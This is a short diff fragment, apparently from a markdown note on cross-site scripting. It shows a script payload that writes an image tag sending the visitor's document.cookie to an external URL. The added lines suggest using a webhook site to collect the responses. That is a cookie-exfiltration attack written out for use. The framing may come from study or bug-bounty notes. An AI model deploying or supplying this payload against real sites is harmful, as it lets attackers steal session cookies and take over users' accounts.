@@ -14,3 +14,7 @@
 document.write('<img src="[URL]?c='+document.cookie+'" />');
 </script>
 ```
+
+Use `webhook site` to view the responses
+
+
